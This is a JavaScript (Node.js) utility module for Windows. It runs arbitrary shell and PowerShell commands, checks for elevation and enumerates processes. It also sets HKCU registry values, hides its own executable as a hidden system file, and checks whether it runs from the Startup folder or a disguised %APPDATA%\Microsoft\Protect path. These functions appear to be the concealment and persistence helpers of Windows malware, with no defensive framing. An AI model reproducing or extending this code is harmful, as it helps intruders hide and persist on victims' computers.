const child_process = require('child_process');
const util = require('util');
const path = require('path');

const Winreg = require('winreg');

const exec = util.promisify(child_process.exec);

const Delay = async (ms) => {
  return await new Promise((resolve) => setTimeout(resolve, ms));
};

const ExecCommand = async (command) => {
  try {
    const output = await exec(command);
    return output.stdout.trim();
  } catch (error) {
    console.error(error);
    return '';
  }
};

const ExecPowerShell = async (command) => {
  try {
    const output = await exec(`powershell -Command "${command}"`);
    return output.stdout.trim();
  } catch (error) {
    console.error(error);
    return '';
  }
};

const IsElevated = async () => {
  try {
    await exec('net session');
    return true;
  } catch {
    return false;
  }
};

const RandString = (length) => {
  const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  return Array.from({ length }, () => charset[Math.floor(Math.random() * charset.length)]).join('');
};

const GetProcesses = async (name) => {
  try {
    const output = await exec('tasklist');

    return output.stdout
      .split('\n')
      .filter((line) => line.toLowerCase().includes(name.toLowerCase()))
      .map((line) => {
        const [name, pid, session, number, memory] = line.split(/\s+/);
        return {
          name: name,
          pid: parseInt(pid),
          session: session,
          number: parseInt(number),
          memory: parseInt(memory.replace(',', '')),
        };
      });
  } catch (error) {
    return [];
  }
};

const GetProcessPath = async (pid) => {
  try {
    const output = await exec(`wmic process where processid=${pid} get ExecutablePath`);

    return output.stdout.trim();
  } catch (error) {
    return '';
  }
};

const CurrentAppPath = async () => {
  try {
    const exeName = path.basename(process.execPath, '.exe');
    const [appProcess] = await GetProcesses(exeName);

    if (appProcess) {
      const exePath = await GetProcessPath(appProcess.pid);
      const cleanPath = exePath.match(/ExecutablePath\s+([^\n\r]+)/);

      if (cleanPath && cleanPath[1]) {
        return cleanPath[1];
      }
    }

    return 'Not Found';
  } catch (error) {
    return 'Not Found';
  }
};

const SetRegistryValue = ({ keyPath, name, type, value }) => {
  const regKey = new Winreg({
    hive: Winreg.HKCU,
    key: keyPath,
  });

  return new Promise((resolve, reject) => {
    try {
      regKey.set(`"${name}"`, Winreg[type], value, (error) => {
        if (error) {
          return reject(error);
        }

        resolve();
      });
    } catch (error) {
      reject(error);
    }
  });
};

const IsStartupDirRunning = async () => {
  try {
    const exePath = await CurrentAppPath();
    if (exePath === 'Not Found') {
      return false;
    }

    const dirPath = path.dirname(exePath);

    const protectPath = path.join(process.env.APPDATA, 'Microsoft', 'Protect');
    const startupPath = 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';

    return dirPath.includes(protectPath) || dirPath.includes(startupPath);
  } catch (error) {
    return false;
  }
};

const IsWishRunning = async () => {
  const exeName = path.basename(process.execPath, '.exe');

  try {
    const runningProcesses = await GetProcesses(exeName);
    return runningProcesses.length > 4;
  } catch (error) {
    return false;
  }
};

const HideSelf = async () => {
  try {
    const exePath = await CurrentAppPath();
    if (exePath === 'Not Found') {
      return;
    }

    await exec(`attrib +h +s "${exePath}"`);
  } catch (error) {
    console.error(error);
  }
};

module.exports = {
  Delay,
  IsWishRunning,
  GetProcesses,
  GetProcessPath,
  CurrentAppPath,
  RandString,
  SetRegistryValue,
  IsStartupDirRunning,
  IsElevated,
  HideSelf,
  ExecCommand,
  ExecPowerShell,
};
